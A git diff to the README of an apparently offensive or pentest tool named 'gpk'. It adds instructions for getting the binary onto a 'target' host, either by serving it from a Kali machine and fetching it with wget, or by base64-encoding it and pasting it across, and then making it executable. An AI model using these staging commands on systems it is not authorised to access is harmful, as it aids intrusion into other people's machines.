@@ -39,3 +39,25 @@ wget -q https://raw.githubusercontent.com/h0ru/gpk/main/bin/gpk -O gpk ; chmod +
 
 ## Check out some images
 ### [IMAGES](https://github.com/h0ru/gpk/blob/main/IMAGES.md)
+---
+
+## Sending to The Target
+### Local Network
+```
+(KALI)
+python3 -m http.server 80
+
+(TARGET)
+wget ip/gpk -O gpk ; chmod +x gpk
+```
+### Via BASE64
+```
+(KALI)
+cat gpk | base64 -w0
+
+(TARGET)
+nano gpk.b64 (paste the base64 gpk code)
+
+base64 -d gpk.b64 > gpk ; chmod +x gpk
+```
+---
